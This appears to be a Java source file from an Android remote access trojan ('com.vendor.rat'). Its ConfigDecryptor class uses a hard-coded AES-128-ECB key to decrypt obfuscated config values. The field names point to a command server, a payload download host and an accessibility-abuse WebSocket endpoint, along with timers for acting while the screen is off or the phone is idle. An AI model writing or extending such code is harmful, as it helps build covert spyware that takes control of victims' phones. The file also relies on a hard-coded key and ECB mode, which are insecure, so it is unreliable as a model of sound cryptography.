package com.vendor.rat.config;

import android.util.Base64;
import android.util.Log;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * 配置文件解密器
 * 使用 AES-128-ECB 解密 Base64(URL_SAFE) 编码的配置值
 *
 * 加密参数:
 *   算法: AES / ECB / PKCS5Padding
 *   密钥: 16 字节 (AES-128)
 *   编码: Base64 URL_SAFE
 */
public class ConfigDecryptor {

    private static final String TAG = "ConfigDecryptor";
    private static final String AES_KEY = "****1qaz2wsx****";

    /**
     * 解密配置文件 JSON
     */
    public static AppConfig decrypt(String encryptedJson) throws Exception {
        JsonObject json = JsonParser.parseString(encryptedJson).getAsJsonObject();

        AppConfig config = new AppConfig();

        // 解密加密字段
        if (json.has("serverHost")) {
            config.setServerHost(decryptValue(json.get("serverHost").getAsString()));
        }
        if (json.has("downloadRatHatHost")) {
            config.setDownloadHost(decryptValue(json.get("downloadRatHatHost").getAsString()));
        }
        if (json.has("guideAccessibilityHost")) {
            config.setWebSocketUrl(decryptValue(json.get("guideAccessibilityHost").getAsString()));
        }

        // 非加密字段
        if (json.has("perScreenOffDuration")) {
            config.setPerScreenOffDuration(json.get("perScreenOffDuration").getAsInt());
        }
        if (json.has("perIdleDuration")) {
            config.setPerIdleDuration(json.get("perIdleDuration").getAsInt());
        }

        return config;
    }

    /**
     * AES-ECB 解密单个值
     */
    public static String decryptValue(String encrypted) throws Exception {
        byte[] decoded = Base64.decode(encrypted, Base64.URL_SAFE);
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        cipher.init(Cipher.DECRYPT_MODE, keySpec);
        byte[] decrypted = cipher.doFinal(decoded);
        return new String(decrypted);
    }

    /**
     * AES-ECB 加密（生成配置时使用）
     */
    public static String encryptValue(String plainText) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        byte[] encrypted = cipher.doFinal(plainText.getBytes());
        return Base64.encodeToString(encrypted, Base64.URL_SAFE);
    }
}
